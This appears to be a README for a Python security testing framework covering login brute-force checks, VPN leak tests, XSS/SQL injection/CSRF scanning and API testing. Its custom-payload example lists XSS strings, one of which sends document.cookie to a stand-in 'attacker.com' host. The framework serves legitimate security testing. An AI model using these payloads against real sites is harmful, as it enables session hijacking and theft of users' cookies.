# Security Testing Suite

A comprehensive framework for security testing of web applications, APIs, authentication systems, and VPN connections.

## Overview

This Security Testing Suite provides a robust solution for identifying security vulnerabilities and testing security mechanisms in various systems. Built with Python, it offers specialized modules for testing authentication systems, VPN connections, web applications, and APIs.

## Features

- **Authentication Testing**: Test login systems, brute force protection, multi-factor authentication, and password policies
- **VPN Testing**: Verify VPN connections, test for DNS/IP leaks, and evaluate kill switch functionality
- **Web Security Scanning**: Detect XSS, SQL injection, and CSRF vulnerabilities in web applications
- **API Security Testing**: Evaluate API authentication, rate limiting, HTTP method handling, and input validation
- **Comprehensive Reporting**: Detailed reports of security findings
- **Extensible Architecture**: Easily add support for additional security tests
- **Cross-Platform Support**: Works on Windows, macOS, and Linux

## Installation

```bash
# Clone the repository
git clone https://github.com/yourusername/security-testing-suite.git
cd security-testing-suite

# Create and activate virtual environment (optional but recommended)
python -m venv venv
source venv/bin/activate  # On Windows: venv\Scripts\activate

# Install dependencies
pip install -r requirements.txt
```

## Project Structure

```
security_testing/
├── auth/                  # Authentication testing
│   └── auth_tester.py     # Authentication testing utilities
├── network/               # Network security testing
│   └── vpn_tester.py      # VPN testing utilities
├── web/                   # Web application security testing
│   └── web_scanner.py     # Web vulnerability scanner
├── api/                   # API security testing
│   └── api_tester.py      # API security tester
├── utils/                 # Utility functions
├── reporting/             # Reporting components
├── tests/                 # Test cases
├── examples/              # Example usage
└── config/                # Configuration files
```

## Usage

### Authentication Testing Example

```python
from security_testing.auth.auth_tester import AuthTester

# Initialize authentication tester
auth_tester = AuthTester(base_url="https://example.com")

# Test login functionality
login_result = auth_tester.test_login(
    endpoint="/login",
    username="testuser",
    password="password123",
    method="POST",
    username_field="username",
    password_field="password"
)

print(f"Login successful: {login_result['success']}")
if login_result['success']:
    print(f"Cookies: {login_result.get('cookies', {})}")
    print(f"Token: {login_result.get('token', 'None')}")

# Test brute force protection
bf_result = auth_tester.test_brute_force_protection(
    endpoint="/login",
    username="testuser",
    password="wrongpassword",
    attempts=10,
    delay=0.5
)

print(f"Brute force protection detected: {bf_result['protection_detected']}")
print(f"Blocked after {bf_result['attempts']} attempts")

# Test multi-factor authentication
mfa_result = auth_tester.test_multi_factor_auth(
    login_endpoint="/login",
    mfa_endpoint="/verify-mfa",
    username="testuser",
    password="password123",
    mfa_code="123456"
)

print(f"MFA enabled: {mfa_result['mfa_enabled']}")
```

### VPN Testing Example

```python
from security_testing.network.vpn_tester import VpnTester

# Initialize VPN tester
vpn_tester = VpnTester(config_dir="/path/to/vpn/configs")

# Test VPN connection
connection_result = vpn_tester.test_connection(
    vpn_type="openvpn",
    server="vpn.example.com",
    username="vpnuser",
    password="vpnpass",
    config_file="example.ovpn"
)

print(f"VPN connection successful: {connection_result['success']}")
if connection_result['success']:
    print(f"IP changed: {connection_result['ip_changed']}")
    print(f"New IP: {connection_result['post_connection_ip']}")
    print(f"DNS changed: {connection_result['dns_changed']}")

    # Test for DNS leaks
    dns_leak_result = vpn_tester.test_dns_leak(queries=5)
    print(f"Potential DNS leak: {dns_leak_result['potential_leak']}")

    # Test for IP leaks
    ip_leak_result = vpn_tester.test_ip_leak(websites=3)
    print(f"Potential IP leak: {ip_leak_result['potential_leak']}")

    # Test kill switch
    kill_switch_result = vpn_tester.test_kill_switch(disconnect_method="force")
    print(f"Kill switch active: {kill_switch_result['kill_switch_active']}")

    # Disconnect VPN
    vpn_tester.disconnect()
```

### Web Security Scanning Example

```python
from security_testing.web.web_scanner import WebSecurityScanner

# Initialize web security scanner
scanner = WebSecurityScanner(base_url="https://example.com")

# Scan for XSS vulnerabilities
xss_results = scanner.scan_xss_vulnerabilities(
    urls=["https://example.com/search", "https://example.com/contact"],
    crawl=True,
    max_urls=10
)

print(f"XSS vulnerabilities found: {xss_results['vulnerabilities_found']}")
print(f"Number of vulnerabilities: {xss_results['vulnerability_count']}")
for vuln in xss_results['vulnerabilities']:
    print(f"- URL: {vuln['url']}")
    print(f"  Payload: {vuln['payload']}")

# Scan for SQL injection vulnerabilities
sql_results = scanner.scan_sql_injection(
    urls=["https://example.com/products"],
    crawl=True,
    max_urls=10
)

print(f"SQL injection vulnerabilities found: {sql_results['vulnerabilities_found']}")
print(f"Number of vulnerabilities: {sql_results['vulnerability_count']}")

# Scan for CSRF vulnerabilities
csrf_results = scanner.scan_csrf_vulnerabilities(
    urls=["https://example.com/profile", "https://example.com/settings"],
    max_urls=10
)

print(f"CSRF vulnerabilities found: {csrf_results['vulnerabilities_found']}")
print(f"Number of vulnerabilities: {csrf_results['vulnerability_count']}")
```

### API Security Testing Example

```python
from security_testing.api.api_tester import ApiSecurityTester

# Initialize API security tester
api_tester = ApiSecurityTester(base_url="https://api.example.com")

# Test API authentication
auth_results = api_tester.test_authentication(
    endpoint="/users",
    auth_types=["none", "basic", "bearer", "api_key"],
    username="apiuser",
    password="apipass",
    token="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    api_key="your-api-key"
)

print("Authentication test results:")
for auth_type, result in auth_results['results'].items():
    if 'error' in result:
        print(f"- {auth_type}: Error - {result['error']}")
    else:
        print(f"- {auth_type}: Status {result['status_code']}, Authenticated: {result['authenticated']}")

# Test rate limiting
rate_limit_results = api_tester.test_rate_limiting(
    endpoint="/products",
    requests_count=50,
    interval=0.1,
    auth={
        "type": "bearer",
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
    }
)

print(f"Rate limited: {rate_limit_results['rate_limited']}")
print(f"Requests sent: {rate_limit_results['requests_sent']}")
if 'rate_limit_headers' in rate_limit_results:
    print("Rate limit headers:")
    for header, value in rate_limit_results['rate_limit_headers'].items():
        print(f"- {header}: {value}")

# Test HTTP methods
http_methods_results = api_tester.test_http_methods(
    endpoint="/users/1",
    methods=["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"],
    auth={
        "type": "bearer",
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
    }
)

print("HTTP methods test results:")
for method, result in http_methods_results['results'].items():
    if 'error' in result:
        print(f"- {method}: Error - {result['error']}")
    else:
        print(f"- {method}: Status {result['status_code']}, Allowed: {result['allowed']}")

# Test input validation
validation_results = api_tester.test_input_validation(
    endpoint="/users",
    method="POST",
    auth={
        "type": "bearer",
        "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
    }
)

print(f"Input validation tests: {validation_results['tests_count']}")
print(f"Passed: {validation_results['passed_tests']}")
print(f"Failed: {validation_results['failed_tests']}")
```

## Configuration

The framework supports configuration through JSON files located in the `config` directory.

Example configuration file (`config/security.json`):

```json
{
  "auth_testing": {
    "default_timeout": 10,
    "default_attempts": 5,
    "default_delay": 0.5
  },
  "web_scanning": {
    "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "max_crawl_depth": 3,
    "max_urls_per_scan": 20,
    "default_timeout": 30
  },
  "api_testing": {
    "default_timeout": 10,
    "default_requests_count": 20,
    "default_interval": 0.1
  }
}
```

## Advanced Features

### Custom XSS Payloads

```python
from security_testing.web.web_scanner import WebSecurityScanner

# Define custom XSS payloads
custom_payloads = [
    '<img src=x onerror=alert(document.domain)>',
    '<svg/onload=alert(document.cookie)>',
    'javascript:alert(document.domain)',
    '"><script>fetch("https://attacker.com/steal?cookie="+document.cookie)</script>',
    '<body onload=alert(document.domain)>'
]

# Initialize scanner with custom payloads
scanner = WebSecurityScanner(base_url="https://example.com")
results = scanner.scan_xss_vulnerabilities(
    urls=["https://example.com/search"],
    payloads=custom_payloads
)
```

### Comprehensive Security Assessment

```python
from security_testing.auth.auth_tester import AuthTester
from security_testing.web.web_scanner import WebSecurityScanner
from security_testing.api.api_tester import ApiSecurityTester
import json

def run_security_assessment(target_url):
    """Run a comprehensive security assessment on a target."""
    results = {
        "target": target_url,
        "timestamp": datetime.now().isoformat(),
        "auth_tests": {},
        "web_tests": {},
        "api_tests": {}
    }
    
    # Authentication tests
    auth_tester = AuthTester(base_url=target_url)
    results["auth_tests"]["login"] = auth_tester.test_login(
        endpoint="/login",
        username="testuser",
        password="password123"
    )
    results["auth_tests"]["brute_force"] = auth_tester.test_brute_force_protection(
        endpoint="/login",
        username="testuser",
        password="wrongpass"
    )
    
    # Web security tests
    web_scanner = WebSecurityScanner(base_url=target_url)
    results["web_tests"]["xss"] = web_scanner.scan_xss_vulnerabilities(
        crawl=True,
        max_urls=10
    )
    results["web_tests"]["sql_injection"] = web_scanner.scan_sql_injection(
        crawl=True,
        max_urls=10
    )
    results["web_tests"]["csrf"] = web_scanner.scan_csrf_vulnerabilities(
        crawl=True,
        max_urls=10
    )
    
    # API security tests
    api_tester = ApiSecurityTester(base_url=f"{target_url}/api")
    results["api_tests"]["authentication"] = api_tester.test_authentication(
        endpoint="/users"
    )
    results["api_tests"]["rate_limiting"] = api_tester.test_rate_limiting(
        endpoint="/products"
    )
    results["api_tests"]["http_methods"] = api_tester.test_http_methods(
        endpoint="/users/1"
    )
    
    # Save results to file
    with open("security_assessment_report.json", "w") as f:
        json.dump(results, f, indent=2)
    
    return results
```

## Contributing

Contributions are welcome! Please feel free to submit a Pull Request.

## License

This project is licensed under the MIT License - see the LICENSE file for details.
